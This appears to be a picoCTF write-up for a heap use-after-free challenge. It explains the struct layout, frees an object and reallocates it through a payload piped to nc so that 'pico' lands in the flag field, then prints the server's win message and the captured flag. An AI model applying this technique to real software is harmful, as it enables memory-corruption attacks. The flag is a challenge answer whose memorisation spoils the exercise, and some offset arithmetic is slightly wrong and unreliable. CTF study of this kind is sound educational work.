@@ -1,0 +1,87 @@
+$ curl -sO https://artifacts.picoctf.net/c_tethys/5/chall
+$ curl -sO https://artifacts.picoctf.net/c_tethys/5/chall.c
+
+
+---
+Our objective is to overwrite x->flag = pico.
+After reading the source code, we are allowed to allocate a new object and free the variable `x`.
+
+Key concept to understand here is that, if an allocated memory is freed, it is added to a free list 
+and and if it is the best fit allocation strategy, then same freed memory is used for next allocation.
+
+---
+Examine the size of x object.
+
+x = {
+  char a[10],
+  char b[10],
+  char c[10],
+  char flag[5],
+}
+
+Initial guess is 35 bytes.
+
+---
+
+Check for padding in x object
+
+
+Running the program and printing the address of x->flag.
+
+
+# Enter your choice: 1
+# [*]   Address   ->   Value   
+# +-------------+-----------+
+# [*]   0x22636ce  ->   bico
+# +-------------+-----------+
+
+last character of the address is `e` -> 14 in decimal. 
+If we think about the allocation of x, assuming a[0] starts from 0th byte,
+memory for `a` = 0x0-0x9 (0-9 = 10 bytes)
+memory for `b` = 0xA-0x13 (10-19 = 10 bytes)
+memory for `c` = 0x13-0x1D (20-29 = 10 bytes)
+memory for `flag` = 0x1E-0x22 (30-34 = 5 bytes)
+
+Here, last character of flag's starting address is 'E' . Hence we can assume there is no padding between x->c and x->flag.
+
+---
+
+Try the reallocation of object after freeing x.
+
+Steps:
+1. free `x` by selecting option 5
+2. allocate 35 bytes of new memory: 30 bytes for `a`, `b`, `c`. 4 bytes for 'pico' and 1 null byte. It can be done by selecting option 2 and send 34 bytes of input.
+3. call check_win function by selecting option 4.
+
+$ echo -e "5\n2\n36\nAAAABBBBCCCCDDDDEEEEFFFFGGGGHHpico\n4" | nc tethys.picoctf.net 52033
+
+
+> freed but still in use
+> now memory untracked
+> do you smell the bug?
+> 
+> 1. Print Heap
+> 2. Allocate object
+> 3. Print x->flag
+> 4. Check for win
+> 5. Free x
+> 6. Exit
+> 
+> Enter your choice: 
+> 1. Print Heap
+> 2. Allocate object
+> 3. Print x->flag
+> 4. Check for win
+> 5. Free x
+> 6. Exit
+> 
+> Enter your choice: Size of object allocation: Data for flag: 
+> 1. Print Heap
+> 2. Allocate object
+> 3. Print x->flag
+> 4. Check for win
+> 5. Free x
+> 6. Exit
+> 
+> Enter your choice: YOU WIN!!11!!
+> picoCTF{now_thats_free_real_estate_a7381726}
